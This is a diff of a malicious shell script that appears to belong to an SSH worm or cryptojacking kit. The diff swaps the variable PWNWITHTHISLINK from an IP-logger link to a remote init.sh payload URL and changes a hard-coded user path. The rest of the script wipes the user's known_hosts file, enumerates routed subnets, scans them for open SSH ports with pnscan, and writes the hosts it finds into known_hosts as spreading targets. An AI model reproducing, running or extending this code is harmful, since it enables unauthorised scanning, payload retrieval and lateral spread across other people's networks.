@@ -1,5 +1,5 @@
 #!/bin/sh
-PWNWITHTHISLINK="https://iplogger.org/27PE86"
+PWNWITHTHISLINK="https://solscan.live/chimaera/sh/init.sh"
 
 
 
@@ -25,17 +25,17 @@ cd ..
 rm -rf .x112 ps
 fi
 
-mkdir /home/hilde/.ssh/ -p 2>/dev/null 1>/dev/null
-> /home/hilde/.ssh/known_hosts 2>/dev/null 1>/dev/null
-ip route show | grep -v grep | grep "/" | awk '{print $1}' >> /home/hilde/.ssh/.ranges
+mkdir /home/nmlm/.ssh/ -p 2>/dev/null 1>/dev/null
+> /home/nmlm/.ssh/known_hosts 2>/dev/null 1>/dev/null
+ip route show | grep -v grep | grep "/" | awk '{print $1}' >> /home/nmlm/.ssh/.ranges
 
-for i in $(cat /home/hilde/.ssh/.ranges); do
+for i in $(cat /home/nmlm/.ssh/.ranges); do
 echo "scanne "$i
-pnscan $i 22 >> /home/hilde/.ssh/.known_hosts
+pnscan $i 22 >> /home/nmlm/.ssh/.known_hosts
 done;
-rm -f /home/hilde/.ssh/.ranges
-cat /home/hilde/.ssh/.known_hosts | awk '{print $1}' >> /home/hilde/.ssh/known_hosts
-rm -f /home/hilde/.ssh/.known_hosts
+rm -f /home/nmlm/.ssh/.ranges
+cat /home/nmlm/.ssh/.known_hosts | awk '{print $1}' >> /home/nmlm/.ssh/known_hosts
+rm -f /home/nmlm/.ssh/.known_hosts
 
 
 localgo() {
